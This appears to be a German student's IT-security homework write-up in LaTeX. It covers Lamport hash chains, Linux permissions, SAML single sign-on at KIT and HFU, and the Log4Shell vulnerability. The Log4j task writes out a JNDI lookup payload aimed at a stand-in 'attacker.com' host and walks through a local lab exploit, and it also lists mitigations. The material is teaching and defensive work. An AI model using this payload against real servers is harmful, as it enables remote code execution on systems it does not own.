\chapter*{Aufgabe 1: Hashketten}

\section*{a) Hashkette der Länge 4}

Gewählte Hashfunktion: SHA-256.
Passphrase $k = $ \texttt{LuisStaudt2026}.
Die Hashkette wird iterativ gebildet: $P_i = SHA256(P_{i-1})$ mit $P_0 = k$.

\begin{lstlisting}[language=bash]
k   = LuisStaudt2026
P_1 = fc0bdf2471b8dcaeb6100f9b95ce6532
      935dafa4fb4f0ef3abb5c56483aebd71
P_2 = b8359d246c00986878167c1e85bc566c
      b55b25904d1ebcf5a826ca072297536a
P_3 = f245e7df73577ecce17b149c4227329d
      b0baf59459a63fc25b2cc2c9d3fb9deb
P_4 = 19d17121ad7c32e1c3f5fa66f7ad4cdc
      552c9e2fe735be427e7933da9bf7ba0b
\end{lstlisting}

\section*{b) Registrierung und erste Anmeldung}

Beim Verfahren nach Lamport wird der höchste Hashwert $P_4$ initial beim Server registriert.
Danach werden die Einmalpasswörter in umgekehrter Reihenfolge ($P_3, P_2, P_1$) zur Anmeldung verwendet.

\textbf{Registrierung:}
\begin{enumerate}
	\item Client berechnet die Kette $P_1, P_2, P_3, P_4$ aus $k$.
	\item Client sendet ausschließlich $P_4$ an den Server.
	\item Server speichert $(\text{user}, P_4, i=4)$.
\end{enumerate}

\textbf{Erste Anmeldung:}
\begin{enumerate}
	\item Server fordert das Passwort zum Index $i-1 = 3$ an.
	\item Client sendet $P_3$.
	\item Server prüft $SHA256(P_3) \stackrel{?}{=} P_4$.
	\item Ergebnis: stimmt überein $\Rightarrow$ Login erfolgreich.
	\item Server ersetzt den gespeicherten Wert durch $P_3$ und erniedrigt den Index auf $i=3$.
\end{enumerate}

Wichtig: Aus $P_3$ lässt sich $P_4$ berechnen, aber nicht umgekehrt.
Ein Angreifer, der $P_4$ kennt, kann daraus nicht den nächsten benötigten Wert $P_3$ ableiten.

\section*{c) Eve fängt $P_{i+1}$ ab}

Eve hat die Verbindung unter Kontrolle und fängt die Antwort $P_{i+1}$ ab, bevor sie Bob erreicht.

\begin{itemize}
	\item Eve kann sich gegenüber Bob anstelle von Alice anmelden, indem sie $P_{i+1}$ selbst weiterreicht.
	\item Da Alice die Antwort bereits verschickt hat, ist $P_{i+1}$ das aktuell angeforderte Einmalpasswort.
	\item Das Passwort bleibt nur für genau \emph{eine} Anmeldung gültig.
	Sobald Bob $P_{i+1}$ akzeptiert, speichert er diesen Wert und fordert beim nächsten Mal $P_i$ an.
	$P_{i+1}$ ist damit verbraucht und wertlos.
	\item Gültigkeit also: bis zur nächsten erfolgreichen Anmeldung mit diesem Passwort; danach nicht mehr nutzbar.
\end{itemize}

\section*{d) Wann fällt der Verlust auf?}

Wenn Eve $P_{i+1}$ einmalig nutzt und die Übertragung von Alice zu Bob unterbunden hat, synchronisieren Alice und Bob ihren Index nicht mehr.
Der Verlust fällt bei der nächsten regulären Anmeldung von Alice auf:

\begin{itemize}
	\item Bob hat den Index bereits auf $i-1$ erniedrigt (nach Eves Anmeldung) und erwartet jetzt $P_i$.
	\item Alice rechnet davon aus, dass $P_{i+1}$ noch nicht angekommen ist, und versucht diesen Wert erneut oder den nächsten in ihrer Zählung.
	\item Dadurch kommt es zu einem Index-Mismatch: Alice sendet einen Hash, dessen Prüfung bei Bob fehlschlägt.
\end{itemize}

Der Angriff wird also spätestens bemerkt, sobald Alice das nächste Mal einen Anmeldeversuch unternimmt.


\chapter*{Aufgabe 2: Rechtemanagement unter Linux}

Alle Befehle werden in \texttt{/tmp/test} ausgeführt.
Die Benutzer alice, bob und eve sowie Testdateien werden wie in der Vorbereitung beschrieben angelegt.

\section*{Vorbereitung}

\begin{lstlisting}[language=bash]
cd /tmp && mkdir test && cd test
sudo useradd alice
sudo useradd bob
sudo useradd eve
cat /etc/passwd | grep -E "alice|bob|eve"
alice:x:1001:1001::/home/alice:/bin/sh
bob:x:1002:1002::/home/bob:/bin/sh
eve:x:1003:1003::/home/eve:/bin/sh

echo "Geheimer Text von Alice"       > alice.txt
echo "Geheimer Text von Bob"         > bob.txt
echo "Alice und Bob teilen sich das" > alicebob.txt
echo "Für alle sichtbar"             > world.txt
\end{lstlisting}

\section*{a) Interpretation von \texttt{ls -l}}

\begin{lstlisting}[language=bash]
drwxrwxr-x  2 luis luis  4096 Apr 15 23:23 ./
-rw-rw-r--  1 luis luis    30 Apr 15 23:23 alicebob.txt
-rw-rw-r--  1 luis luis    24 Apr 15 23:23 alice.txt
-rw-rw-r--  1 luis luis    22 Apr 15 23:23 bob.txt
-rw-rw-r--  1 luis luis    19 Apr 15 23:23 world.txt
\end{lstlisting}

Spaltenbedeutung: Rechtemaske $\vert$ Anzahl Hardlinks $\vert$ Besitzer $\vert$ Gruppe $\vert$ Größe $\vert$ Datum $\vert$ Name.

Die Rechtemaske besteht aus einem Dateityp (\texttt{-} = Datei, \texttt{d} = Verzeichnis) und drei Gruppen zu je drei Bits für \emph{owner}, \emph{group} und \emph{others} mit jeweils \texttt{r} (lesen, 4), \texttt{w} (schreiben, 2) und \texttt{x} (ausführen, 1).

Alle Testdateien gehören aktuell \texttt{luis:luis} mit der Maske \texttt{-rw-rw-r--} (664).
Das heißt: Besitzer und Gruppe dürfen lesen und schreiben, alle anderen dürfen nur lesen.

\section*{b) Besitzverhältnisse mit \texttt{chown} ändern}

\begin{lstlisting}[language=bash]
sudo chown alice:alice alice.txt
sudo chown alice:alice alicebob.txt
sudo chown bob:bob     bob.txt
sudo chown bob:bob     world.txt
ls -l
-rw-rw-r-- 1 alice alice 30 Apr 15 23:23 alicebob.txt
-rw-rw-r-- 1 alice alice 24 Apr 15 23:23 alice.txt
-rw-rw-r-- 1 bob   bob   22 Apr 15 23:23 bob.txt
-rw-rw-r-- 1 bob   bob   19 Apr 15 23:23 world.txt
\end{lstlisting}

\section*{c) Alice liest \texttt{bob.txt}?}

\begin{lstlisting}[language=bash]
sudo su alice
$ whoami
alice
$ cat bob.txt
Geheimer Text von Bob
$ cat alice.txt
Geheimer Text von Alice
\end{lstlisting}

Alice kann \texttt{bob.txt} lesen, obwohl die Datei Bob gehört.
Grund: Die Rechtemaske \texttt{-rw-rw-r--} gibt allen anderen Benutzern (\emph{others}) Leserechte.
Alice fällt für \texttt{bob.txt} unter \emph{others} und darf deshalb den Inhalt sehen.
Erst mit strikteren Rechten (600) wird der Zugriff verweigert.

\section*{d) Zugriff nur für den Besitzer (600)}

\begin{lstlisting}[language=bash]
sudo chmod 600 alice.txt bob.txt alicebob.txt world.txt
ls -l
-rw------- 1 alice alice 30 Apr 15 23:23 alicebob.txt
-rw------- 1 alice alice 24 Apr 15 23:23 alice.txt
-rw------- 1 bob   bob   22 Apr 15 23:23 bob.txt
-rw------- 1 bob   bob   19 Apr 15 23:23 world.txt
\end{lstlisting}

Prüfung als Alice, Bob und Eve:

\begin{lstlisting}[language=bash]
sudo su alice
$ cat alice.txt
Geheimer Text von Alice
$ cat bob.txt
cat: bob.txt: Permission denied

sudo su bob
$ cat bob.txt
Geheimer Text von Bob
$ cat alice.txt
cat: alice.txt: Permission denied

sudo su eve
$ cat alice.txt
cat: alice.txt: Permission denied
$ cat bob.txt
cat: bob.txt: Permission denied
\end{lstlisting}

Der Zugriff wird jetzt bei allen fremden Benutzern korrekt verweigert.

\section*{e) \texttt{alicebob.txt} gemeinsam für Alice und Bob}

Eine gemeinsame Gruppe \texttt{aliceundbob} wird angelegt, Alice und Bob werden Mitglieder.
Die Datei erhält diese Gruppe als Gruppenbesitzer und die Maske \texttt{660}.

\begin{lstlisting}[language=bash]
sudo groupadd aliceundbob
sudo usermod -a -G aliceundbob alice
sudo usermod -a -G aliceundbob bob
sudo chown alice:aliceundbob alicebob.txt
sudo chmod 660 alicebob.txt
ls -l
-rw-rw---- 1 alice aliceundbob 30 Apr 15 23:23 alicebob.txt
-rw------- 1 alice alice       24 Apr 15 23:23 alice.txt
-rw------- 1 bob   bob         22 Apr 15 23:23 bob.txt
-rw------- 1 bob   bob         19 Apr 15 23:23 world.txt
\end{lstlisting}

Prüfung (Login-Shell \texttt{su -}, damit die neue Gruppenzugehörigkeit aktiv ist):

\begin{lstlisting}[language=bash]
sudo su - alice -c "cat /tmp/test/alicebob.txt"
Alice und Bob teilen sich das

sudo su - bob -c "cat /tmp/test/alicebob.txt"
Alice und Bob teilen sich das

sudo su - eve -c "cat /tmp/test/alicebob.txt"
cat: /tmp/test/alicebob.txt: Permission denied
\end{lstlisting}

Alice und Bob dürfen lesen und schreiben, Eve nicht.

\section*{f) \texttt{world.txt} für alle}

\begin{lstlisting}[language=bash]
sudo chmod 666 world.txt
ls -l
-rw-rw---- 1 alice aliceundbob 48 Apr 15 23:29 alicebob.txt
-rw------- 1 alice alice       24 Apr 15 23:23 alice.txt
-rw------- 1 bob   bob         22 Apr 15 23:23 bob.txt
-rw-rw-rw- 1 bob   bob         19 Apr 15 23:23 world.txt

sudo su - eve -c "cat /tmp/test/world.txt"
Für alle sichtbar
\end{lstlisting}

Mit \texttt{666} dürfen Besitzer, Gruppe und alle anderen lesen und schreiben.


\chapter*{Aufgabe 3: SAML und Identitäts-Föderation}

Gegenstand der Untersuchung ist die Anmeldung am Dienst \url{bwsyncandshare.kit.edu} im Inkognito-Modus.
Die Analyse erfolgt anhand einer HAR-Mitschrift aus den Entwicklertools.

\section*{a) Warum kann ich mich am KIT-Dienst mit HFU-Account anmelden?}

bwSync\&Share wird vom KIT betrieben, ist aber Teil der landesweiten Föderation \emph{bwIDM}.
Der Dienst nimmt nur die Rolle des Service Providers (SP) ein und lagert die Authentifizierung an einen Identity Provider (IdP) aus.
Beim Login wählt der Nutzer seine Hochschule; der SAML-Standard sorgt dafür, dass der HFU-IdP (\url{idp2.hs-furtwangen.de}) die Identität bestätigt.
Nach erfolgreicher Prüfung übermittelt der IdP eine signierte SAML-Assertion an den SP, der daraufhin eine lokale Sitzung eröffnet.

Die eigentlichen Zugangsdaten verlassen dabei nie die HFU.
Das KIT vertraut ausschließlich der Signatur des HFU-IdPs.

\section*{b) Host-Kette beim Aufruf von bwSync\&Share}

Im Inkognito-Fenster werden nacheinander folgende Hosts angesprochen (Reihenfolge aus HAR):

\begin{enumerate}
	\item \texttt{bwsyncandshare.kit.edu}: SP, erzeugt initialen \texttt{SAMLRequest} und leitet weiter.
	\item \texttt{bwidm.scc.kit.edu}: Discovery-/Shibboleth-SP der bwIDM-Föderation, forwarded zum IdP der gewählten Hochschule.
	\item \texttt{idp2.hs-furtwangen.de}: HFU-IdP, erzeugt eigenen \texttt{SAMLRequest}, verlangt Login.
	\item \texttt{login.microsoftonline.com}: Azure AD der HFU, hier erfolgt die eigentliche Eingabe von Benutzername, Passwort und MFA.
	\item Rückweg: Azure AD $\to$ HFU-IdP $\to$ bwIDM-SP $\to$ bwSync\&Share mit signierter SAML-Assertion.
\end{enumerate}

Auffällig: Der HFU-IdP delegiert die Anmeldung selbst an Microsoft Azure AD weiter.
Shibboleth fungiert hier nur noch als SAML-Frontend, die Identitätsprüfung erfolgt im Microsoft-Tenant der HFU.

\textbf{Übertragene Daten (Auszug):}

Initialer SAML-Request vom SP (bwSync\&Share) an bwIDM:

\begin{lstlisting}[language=XML]
<samlp:AuthnRequest
    ID="ONELOGIN_f207b0bd03a182e31c4af2883dc21bc687b5a15b"
    Version="2.0" IssueInstant="2026-04-15T20:32:52Z"
    Destination="https://bwidm.scc.kit.edu/saml/idp/redirect"
    ProtocolBinding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST"
    AssertionConsumerServiceURL=
      "https://bwsyncandshare.kit.edu/apps/user_saml/saml/acs">
  <saml:Issuer>
    https://bwsyncandshare.kit.edu/apps/user_saml/saml/metadata
  </saml:Issuer>
  <samlp:NameIDPolicy
    Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified"
    AllowCreate="true" />
</samlp:AuthnRequest>
\end{lstlisting}

Die Antwort des IdP ist eine verschlüsselte SAML-Assertion, die per Hidden-Form und automatischem POST an den \texttt{AssertionConsumerService} des SPs gesendet wird.

\section*{c) Warum kein erneuter Login bei Felix?}

Nach dem erfolgreichen Login bei bwSync\&Share hat der Browser das Cookie\\ \texttt{\_\_Host-shib\_idp\_session} beim HFU-IdP gesetzt.
Dieses Cookie bindet die aktive IdP-Sitzung an den Browser.

Ruft der Nutzer anschließend Felix auf, beginnt die gleiche SAML-Kette: Felix sendet einen \texttt{SAMLRequest} an denselben IdP.
Der IdP erkennt die laufende Sitzung anhand des Cookies und überspringt die Anmeldemaske komplett.
Er erzeugt sofort eine neue SAML-Assertion für den neuen SP (Felix).
Aus Nutzersicht entsteht so der Eindruck eines Single-Sign-On.

\section*{d) Vergleich zu Kerberos}

Sowohl Kerberos als auch SAML realisieren Single-Sign-On mittels eines vertrauten Dritten.

\begin{itemize}
	\item Kerberos KDC (Authentication Server + TGS) entspricht dem SAML-IdP.
	\item Kerberos-Dienst (z.\,B. Fileserver) entspricht dem SAML-SP.
	\item Das \emph{Ticket-Granting-Ticket} (TGT) entspricht am ehesten dem Cookie\\ \texttt{\_\_Host-shib\_idp\_session} beim IdP: Beide dienen als Nachweis einer aktiven Anmeldung und werden für weitere Authentifizierungen wiederverwendet.
	\item Das pro Dienst ausgestellte \emph{Service-Ticket} entspricht der einzelnen SAML-Assertion, die der IdP für jeden SP erzeugt.
\end{itemize}

Hauptunterschied: Kerberos arbeitet nur im lokalen Netz mit symmetrischer Kryptografie, SAML nutzt asymmetrische Signaturen über HTTP und ist deshalb auch organisationsübergreifend einsetzbar.


\chapter*{Aufgabe 4: Log4j-Schwachstelle}

\section*{a) Beschreibung der Sicherheitslücke}

Die Log4j-Schwachstelle (bekannt als \emph{Log4Shell}) betrifft die weitverbreitete Java-Logging-Bibliothek Apache Log4j 2 in Versionen vor 2.17.0.

\textbf{Kernproblem:} Log4j unterstützt sogenannte \emph{Lookups} in Log-Nachrichten.
Wenn eine Benutzereingabe (z.\,B. ein HTTP-Header, ein Suchbegriff oder ein Benutzername) geloggt wird, interpretiert Log4j eingebettete Ausdrücke der Form \texttt{\$\{jndi:ldap://attacker.com/exploit\}} und führt diese aus.

\textbf{Angriffsablauf:}
\begin{enumerate}
	\item Der Angreifer sendet eine manipulierte Eingabe an eine Webanwendung, z.\,B. im User-Agent-Header:
	      \begin{lstlisting}[language=bash]
User-Agent: ${jndi:ldap://attacker.com/exploit}
	      \end{lstlisting}
	\item Die Anwendung loggt die Eingabe mit Log4j.
	\item Log4j erkennt den \texttt{\$\{jndi:...\}}-Ausdruck und führt einen JNDI-Lookup (Java Naming and Directory Interface) durch.
	\item Der JNDI-Lookup kontaktiert den vom Angreifer kontrollierten LDAP-Server.
	\item Der LDAP-Server antwortet mit einer Referenz auf eine Java-Klasse (serialisiertes Objekt).
	\item Die JVM lädt und instanziiert die Klasse $\Rightarrow$ \textbf{Remote Code Execution (RCE)} auf dem Server.
\end{enumerate}

\textbf{Zentrale Schwächen:}
\begin{itemize}
	\item \textbf{Benutzereingaben werden als Code interpretiert:} Log4j evaluiert Lookup-Ausdrücke in Log-Nachrichten, ohne zwischen vertrauenswürdigem Code und Benutzereingaben zu unterscheiden.
	\item \textbf{Netzwerkzugriff aus dem Logger:} JNDI erlaubt es, externe Ressourcen über LDAP/RMI nachzuladen, was einen Ausbruch aus der Anwendung ermöglicht.
	\item \textbf{Standardmäßig aktiviert:} Die Lookup-Funktion war in der Standardkonfiguration aktiv, ohne dass Entwickler explizit zustimmen mussten.
\end{itemize}

\section*{b) CVE-Nummer}

Die primäre Schwachstelle wurde als \textbf{CVE-2021-44228} registriert (CVSS-Score: 10.0, kritisch).

Weitere verwandte CVEs:
\begin{itemize}
	\item CVE-2021-45046: Unvollständiger Fix in 2.15.0
	\item CVE-2021-45105: Denial-of-Service über rekursive Lookups
	\item CVE-2021-44832: RCE über manipulierte Konfiguration
\end{itemize}

\section*{c) Zugehörige CWE-Schwachstellen}

Aus der MITRE CWE Top-25 Liste (2021) sind folgende Schwachstellen relevant:

\begin{itemize}
	\item \textbf{CWE-20: Improper Input Validation} -- Benutzereingaben werden ohne Validierung oder Bereinigung an Log4j weitergereicht und dort als Lookup-Ausdrücke interpretiert.
	\item \textbf{CWE-502: Deserialization of Untrusted Data} -- Der über JNDI/LDAP nachgeladene Code wird als serialisiertes Java-Objekt instanziiert, ohne Prüfung der Herkunft.
	\item \textbf{CWE-917: Improper Neutralization of Special Elements used in an Expression Language Statement (Expression Language Injection)} -- Log4j's Lookup-Syntax (\texttt{\$\{...\}}) ist eine Expression Language, die in Log-Nachrichten nicht neutralisiert wird.
\end{itemize}

\section*{d) Analyse des VulnerableServer}

Der bereitgestellte Server (\texttt{VulnerableServer.java}) ist ein minimaler HTTP-Server auf Port 8080.
Bei einem Aufruf von \texttt{http://127.0.0.1:8080/irgendetwas} geschieht Folgendes:

\begin{enumerate}
	\item Der Server nimmt die TCP-Verbindung an (Zeile 19).
	\item Die angeforderte Ressource wird aus der HTTP-Anfrage extrahiert und URL-dekodiert (Zeilen 46--48).
	\item Die Ressource wird per Log4j geloggt (Zeile 33).
	\item Eine HTML-Antwort mit der Ressource wird zurückgesendet (Zeilen 36--37).
\end{enumerate}

\textbf{Ausgabe bei normalem Aufruf:}

\begin{lstlisting}[language=bash]
Server bereit...
11:41:11.932 [main] OFF VulnerableServer
  - Angefragte Resource: /irgendetwas
\end{lstlisting}

\textbf{Die verwundbare Zeile ist Zeile 33:}

\begin{lstlisting}[language=Java]
logger.always().log("Angefragte Resource: " + requestedRessource);
\end{lstlisting}

Hier wird die vom Benutzer kontrollierte Eingabe \texttt{requestedRessource} direkt an Log4j übergeben.
Log4j evaluiert darin enthaltene Lookup-Ausdrücke wie \texttt{\$\{jndi:ldap://...\}}.

Zusätzlich setzt Zeile 13 die Systemeigenschaft \texttt{com.sun.jndi.ldap.object.trustURLCodebase} auf \texttt{true}, was das Nachladen von Remote-Klassen über LDAP explizit erlaubt.

\section*{e) Ausführung des Exploits}

Der Exploit (\texttt{Exploit.java}) startet einen LDAP-Server auf \texttt{127.0.0.1:389}.
Wenn ein Angreifer die URL \texttt{http://127.0.0.1:8080/\$\{jndi:ldap://127.0.0.1/exe\}} aufruft, passiert:

\begin{enumerate}
	\item Der VulnerableServer URL-dekodiert die Eingabe und übergibt sie an Log4j.
	\item Log4j erkennt den \texttt{\$\{jndi:ldap://127.0.0.1/exe\}}-Ausdruck und führt einen JNDI-Lookup durch.
	\item Der Lookup kontaktiert den LDAP-Server des Angreifers auf Port 389.
	\item Der LDAP-Server antwortet mit einem serialisierten \texttt{Payload}-Objekt (Zeilen 67--81 in Exploit.java).
	\item Die JVM deserialisiert das Objekt und ruft \texttt{Payload.toString()} auf.
	\item \texttt{toString()} führt \texttt{Runtime.getRuntime().exec()} aus, was auf dem Server beliebigen Code ausführt (im Beispiel: Taschenrechner öffnen).
\end{enumerate}

Dies demonstriert \textbf{Remote Code Execution (RCE)}: Ein Angreifer kann durch eine einfache HTTP-Anfrage beliebigen Code auf dem Server ausführen, weil eine Logging-Bibliothek Benutzereingaben als Ausdrücke interpretiert.

\section*{f) Schwachstelle verhindern (ohne Log4j-Patch)}

\begin{itemize}
	\item \textbf{JNDI-Lookups deaktivieren:} Die JVM-Option \texttt{-Dlog4j2.formatMsgNoLookups=true} oder die Umgebungsvariable \texttt{LOG4J\_FORMAT\_MSG\_NO\_LOOKUPS=true} setzen.
	\item \textbf{JndiLookup-Klasse entfernen:} Die Klasse \texttt{JndiLookup.class} aus dem Log4j-JAR löschen:
	      \begin{lstlisting}[language=bash]
zip -q -d log4j-core-*.jar
    org/apache/logging/log4j/core/lookup/JndiLookup.class
	      \end{lstlisting}
	\item \textbf{Ausgehende Netzwerkverbindungen einschränken:} Per Firewall LDAP/RMI-Verbindungen (Port 389, 1099) vom Anwendungsserver nach außen blockieren.
	      So kann der JNDI-Lookup den Angreifer-Server nicht erreichen.
	\item \textbf{Eingaben bereinigen:} Benutzereingaben vor dem Loggen filtern, sodass \texttt{\$\{}-Ausdrücke nicht an Log4j weitergegeben werden.
	\item \textbf{Java-Version aktualisieren:} Ab Java 8u191 ist \texttt{com.sun.jndi.ldap.object.trustURLCodebase} standardmäßig \texttt{false}, was das Nachladen von Remote-Klassen über LDAP unterbindet.
\end{itemize}
